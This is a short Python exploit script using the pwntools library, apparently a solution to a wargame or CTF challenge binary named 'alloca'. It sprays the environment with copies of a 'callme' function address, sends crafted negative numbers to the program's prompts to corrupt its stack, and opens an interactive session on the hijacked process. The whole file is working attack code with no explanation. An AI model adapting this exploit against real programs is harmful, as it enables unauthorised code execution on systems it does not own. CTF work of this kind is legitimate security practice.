#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *


callme = p32(ELF("/home/alloca/alloca").sym['callme'])
sp = callme + 30000

e = {str(i): sp for i in xrange(10)}
print e
io = process("/home/alloca/alloca", env = e)
io.sendlineafter(" : ", "-82")
io.sendline("-4718592")
io.interactive()
